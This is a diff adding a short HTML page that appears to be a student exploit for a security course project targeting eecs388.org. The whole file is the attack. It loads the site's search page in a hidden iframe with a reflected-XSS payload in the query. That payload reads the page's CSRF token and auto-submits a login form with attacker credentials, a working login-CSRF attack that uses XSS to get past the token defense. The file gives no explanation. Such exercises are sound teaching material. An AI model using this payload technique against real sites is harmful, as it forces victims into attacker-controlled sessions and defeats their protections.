@@ -1,0 +1,12 @@
+<meta charset="utf-8">
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
+
+<iframe style='display:none' id='blank_frame'></iframe>
+
+<script>
+  	var form = "<form target='blank_frame' name='csrf' action='https://eecs388.org/project2/login?csrfdefense=1&xssdefense=0' method='POST'><input name='username' value='attacker' /><input name='password' value='l33th4x' /><input name='token' value='' /></form>";
+  	var set_token = "<script>var get_token=document.getElementsByName('csrf_token')[0].value;document.getElementsByName('token').value=get_token;";
+  	var query = "<iframe name='blank_frame'></iframe>" + form + set_token + "document.csrf.submit()</scrip" + "t>";  
+  	var url = "https://eecs388.org/project2/search?csrfdefense=1&xssdefense=0&q=" + encodeURIComponent(query);
+  	$('#blank_frame').attr("src", url);
+</script>
